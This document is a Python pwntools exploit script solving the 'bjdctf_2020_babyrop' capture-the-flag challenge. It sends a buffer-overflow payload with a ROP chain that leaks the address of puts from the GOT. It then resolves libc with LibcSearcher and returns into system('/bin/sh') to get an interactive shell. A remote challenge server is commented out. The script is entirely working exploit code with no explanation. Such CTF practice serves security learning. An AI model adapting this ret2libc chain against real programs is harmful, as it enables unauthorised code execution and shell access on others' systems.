from LibcSearcher import LibcSearcher
from pwn import *


def bjdctf_2020_babyrop(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/bjdctf_2020_babyrop'):
    context(log_level='debug', arch='amd64', os='linux')
    target = process([file_name])
    # target = remote('node5.buuoj.cn', 25633)
    target_elf = ELF(file_name)

    puts_plt = p64(target_elf.plt['puts'])
    puts_got = p64(target_elf.got['puts'])
    vuln_addr = p64(target_elf.symbols['vuln'])

    pop_ret_gadget = p64(0x400733)  # pop rdi ; ret

    payload_1 = b'A' * (0x20 + 0x8)
    # puts(puts_got)
    payload_1 += pop_ret_gadget + puts_got + puts_plt
    # vuln()
    payload_1 += vuln_addr

    target.sendlineafter(b'story!', payload_1)

    target.recvuntil('\n')
    puts_addr = u64(target.recv(6).ljust(8, b'\x00'))
    print(hex(puts_addr))

    searcher = LibcSearcher('puts', puts_addr)
    libc_base_addr = puts_addr - searcher.dump('puts')
    system_addr = p64(libc_base_addr + searcher.dump('system'))
    bin_sh_addr = p64(libc_base_addr + searcher.dump('str_bin_sh'))

    payload_2 = b'A' * (0x20 + 0x8)
    # system(/bin/sh)
    payload_2 += pop_ret_gadget + bin_sh_addr + system_addr

    gdb.attach(target)

    target.sendlineafter(b'story!', payload_2)

    target.interactive()


if __name__ == '__main__':
    bjdctf_2020_babyrop()
